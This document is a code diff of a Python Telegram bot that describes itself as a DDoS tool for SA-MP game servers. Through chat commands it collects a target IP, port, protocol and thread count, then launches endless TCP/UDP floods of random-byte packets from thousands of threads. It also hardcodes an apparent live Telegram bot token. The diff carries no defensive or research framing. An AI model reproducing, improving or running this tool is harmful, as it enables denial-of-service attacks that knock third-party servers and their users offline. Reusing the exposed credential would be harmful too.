@@ -6,21 +6,16 @@ import time
 import sys
 import telebot
 
-# Get token from environment variable
-BOT_TOKEN ='8462382934:AAF_dC1yr5YZjXZpTp0FXYWdZaLtuy8F8d0'
-if not BOT_TOKEN:
-    print("Error: BOT_TOKEN environment variable not set!")
-    sys.exit(1)
-
-bot = telebot.TeleBot('BOT_TOKEN')
+# PALITAN ITO NG BAGONG TOKEN MO
+BOT_TOKEN = "8462382934:AAF_dC1yr5YZjXZpTp0FXYWdZaLtuy8F8d0"
+bot = telebot.TeleBot(BOT_TOKEN)
 
 # Global variables
 user_data = {}
 attack_threads = {}
 attack_running = {}
 
-# Admin/Authorized user IDs
-AUTHORIZED_USERS = []  # Add user IDs as integers
+AUTHORIZED_USERS = []  # Add your Telegram user ID here
 
 def is_authorized(user_id):
     if not AUTHORIZED_USERS:
@@ -30,82 +25,64 @@ def is_authorized(user_id):
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     if not is_authorized(message.from_user.id):
-        bot.reply_to(message, "You are not authorized to use this bot.")
+        bot.reply_to(message, "You are not authorized.")
         return
     
     welcome_text = """YORODA HAMADA
 
 Security / Network Tool
-Mode: DDOS (SA-MP) 
-Codename: Ddos Bot Net Samp
-
+Mode: DDOS (SA-MP)
 Operator: Yoroda Hamada
 
 Commands:
-/start - Show this menu
 /attack - Start attack
 /stop - Stop attack
-/status - Check attack status
-/help - Show help menu
-
-Use /attack to begin configuration"""
+/status - Check status
+/help - Help menu"""
     bot.reply_to(message, welcome_text)
 
 @bot.message_handler(commands=['help'])
 def send_help(message):
     if not is_authorized(message.from_user.id):
-        bot.reply_to(message, "You are not authorized to use this bot.")
+        bot.reply_to(message, "You are not authorized.")
         return
     
-    help_text = """Help Menu
-
-How to use:
-1. Use /attack to start
-2. Enter target IP/Host
-3. Enter target port
-4. Choose attack type: TCP or UDP
-5. Enter thread count (100-5000)
-
-Note: Unlimited packets - attack runs continuously!
+    help_text = """How to use:
+1. /attack
+2. Enter IP
+3. Enter port
+4. Choose tcp/udp/both
+5. Enter thread count
 
 Commands:
-/start - Main menu
-/attack - Start new attack
-/stop - Stop current attack
-/status - Check attack status
-/help - Show this menu"""
+/attack - New attack
+/stop - Stop attack
+/status - Check status"""
     bot.reply_to(message, help_text)
 
 @bot.message_handler(commands=['attack'])
 def start_attack(message):
     if not is_authorized(message.from_user.id):
-        bot.reply_to(message, "You are not authorized to use this bot.")
+        bot.reply_to(message, "You are not authorized.")
         return
     
     user_id = message.from_user.id
     
-    # Check if attack is already running
     if user_id in attack_running and attack_running[user_id]:
-        bot.reply_to(message, "Attack already running!\nUse /stop to stop the current attack.")
+        bot.reply_to(message, "Attack already running! Use /stop")
         return
     
     user_data[user_id] = {}
     user_data[user_id]['step'] = 'ip'
     
-    bot.reply_to(message, """Target Profile
-
-Setup Attack
-Please enter the target IP/Host:
-(Example: 127.0.0.1 or example.com)
-
-Reply with the IP address.""")
+    bot.reply_to(message, "Enter target IP/Host:")
 
 @bot.message_handler(func=lambda message: True)
 def handle_messages(message):
     user_id = message.from_user.id
     
     if not is_authorized(user_id):
-        bot.reply_to(message, "You are not authorized to use this bot.")
+        bot.reply_to(message, "Not authorized.")
         return
     
     if user_id not in user_data:
@@ -116,106 +93,69 @@ def handle_messages(message):
     if step == 'ip':
         user_data[user_id]['ip'] = message.text.strip()
         user_data[user_id]['step'] = 'port'
-        bot.reply_to(message, f"""IP Set: {user_data[user_id]['ip']}
-
-Service Port
-Please enter the target port:
-(SA-MP default: 7777)
-
-Reply with the port number.""")
+        bot.reply_to(message, f"IP: {user_data[user_id]['ip']}\nEnter port:")
     
     elif step == 'port':
         try:
             port = int(message.text.strip())
             user_data[user_id]['port'] = port
             user_data[user_id]['step'] = 'attack_type'
-            bot.reply_to(message, f"""Port Set: {port}
-
-Attack Type
-Please choose attack type:
-Reply with 'tcp' for TCP attack
-Reply with 'udp' for UDP attack
-Reply with 'both' for both TCP and UDP""")
+            bot.reply_to(message, f"Port: {port}\nChoose attack type:\ntcp / udp / both")
         except ValueError:
-            bot.reply_to(message, "Invalid port number. Please enter a valid number.")
+            bot.reply_to(message, "Invalid port. Enter number:")
     
     elif step == 'attack_type':
         attack_type = message.text.strip().lower()
         if attack_type in ['tcp', 'udp', 'both']:
             user_data[user_id]['attack_type'] = attack_type
             user_data[user_id]['step'] = 'threads'
-            bot.reply_to(message, f"""Attack Type Set: {attack_type.upper()}
-
-Threads
-Please enter the number of threads:
-(Recommended: 100-5000)
-
-Note: Unlimited packets - attack runs continuously!
-
-Reply with the thread count.""")
+            bot.reply_to(message, f"Attack: {attack_type.upper()}\nEnter thread count (100-5000):")
         else:
-            bot.reply_to(message, "Invalid choice. Please reply with 'tcp', 'udp', or 'both'.")
+            bot.reply_to(message, "Invalid. Choose tcp/udp/both:")
     
     elif step == 'threads':
         try:
             threads = int(message.text.strip())
             if threads < 1:
-                bot.reply_to(message, "Threads must be greater than 0.")
+                bot.reply_to(message, "Must be > 0")
                 return
             user_data[user_id]['threads'] = threads
             user_data[user_id]['step'] = 'confirm'
             
-            # Show summary
-            summary = f"""ATTACK CONFIGURATION
-
-Target Profile
+            summary = f"""CONFIGURATION
 IP: {user_data[user_id]['ip']}
 Port: {user_data[user_id]['port']}
-Attack Type: {user_data[user_id]['attack_type'].upper()}
-Threads: {user_data[user_id]['threads']}
-Packets: UNLIMITED
+Type: {user_data[user_id]['attack_type'].upper()}
+Threads: {threads}
 
-Status
-Ready to start attack.
-
-Reply with 'y' to start the attack or 'n' to cancel."""
+Start attack? (y/n)"""
             bot.reply_to(message, summary)
             
         except ValueError:
-            bot.reply_to(message, "Invalid number. Please enter a valid number.")
+            bot.reply_to(message, "Invalid number:")
     
     elif step == 'confirm':
         if message.text.strip().lower() == 'y':
-            # Start the attack
             ip = user_data[user_id]['ip']
             port = user_data[user_id]['port']
             attack_type = user_data[user_id]['attack_type']
             threads = user_data[user_id]['threads']
             
-            # Mark attack as running
             attack_running[user_id] = True
             
-            bot.reply_to(message, f"""ATTACK STARTED
-
+            bot.reply_to(message, f"""ATTACK STARTED!
 Target: {ip}:{port}
-Attack Type: {attack_type.upper()}
+Type: {attack_type.upper()}
 Threads: {threads}
-Packets: UNLIMITED
-
-Status: Running...
-Use /stop to stop the attack.""")
+Status: RUNNING""")
             
-            # Start attack threads
             start_attack_threads(user_id, ip, port, attack_type, threads)
             
         else:
-            bot.reply_to(message, "Attack cancelled. Use /attack to start a new one.")
+            bot.reply_to(message, "Cancelled.")
             del user_data[user_id]
 
 def start_attack_threads(user_id, ip, port, attack_type, threads):
-    """Start unlimited attack threads - Same as original Layer4_UDP.py"""
-    
-    # UDP Attack - Same as original xxxx()
     def udp_attack():
         data = random._urandom(998)
         while attack_running.get(user_id, False):
@@ -227,7 +167,6 @@ def start_attack_threads(user_id, ip, port, attack_type, threads):
             except:
                 pass
     
-    # TCP Attack - Same as original xx()
     def tcp_attack():
         data = random._urandom(871)
         while attack_running.get(user_id, False):
@@ -240,10 +179,8 @@ def start_attack_threads(user_id, ip, port, attack_type, threads):
             except:
                 pass
     
-    # Store threads for cleanup
     attack_threads[user_id] = []
     
-    # Start threads - Same as original pattern
     if attack_type == 'udp':
         for _ in range(threads):
             t = threading.Thread(target=udp_attack)
@@ -279,49 +216,31 @@ def start_attack_threads(user_id, ip, port, attack_type, threads):
 @bot.message_handler(commands=['stop'])
 def stop_attack(message):
     if not is_authorized(message.from_user.id):
-        bot.reply_to(message, "You are not authorized to use this bot.")
+        bot.reply_to(message, "Not authorized.")
         return
     
     user_id = message.from_user.id
     
     if user_id in attack_running and attack_running[user_id]:
         attack_running[user_id] = False
-        
-        if user_id in attack_threads:
-            attack_threads[user_id] = []
-        
-        bot.reply_to(message, """ATTACK STOPPED
-
-The attack has been stopped.
-
-To start a new attack, use /attack""")
+        attack_threads[user_id] = []
+        bot.reply_to(message, "ATTACK STOPPED!")
     else:
-        bot.reply_to(message, "No active attack to stop.\nUse /attack to start one.")
+        bot.reply_to(message, "No active attack.")
 
 @bot.message_handler(commands=['status'])
 def check_status(message):
     if not is_authorized(message.from_user.id):
-        bot.reply_to(message, "You are not authorized to use this bot.")
+        bot.reply_to(message, "Not authorized.")
         return
     
     user_id = message.from_user.id
     is_running = attack_running.get(user_id, False)
     
-    status_text = f"""System Status
-
-Bot Status: Online
-
-Active Attacks: {'Running' if is_running else 'No active attack'}
-
-Attack Details
-Operator: Yoroda Hamada
-Version: v1.0
-Mode: DDOS (SA-MP) THAILAND
-Packets: UNLIMITED
-Threading: {threading.active_count()} active threads
-
-Use /attack to start a new attack.
-Use /stop to stop the current attack."""
+    status_text = f"""STATUS
+Bot: Online
+Attack: {'RUNNING' if is_running else 'STOPPED'}
+Threads: {threading.active_count()} active"""
     bot.reply_to(message, status_text)
 
 if __name__ == "__main__":
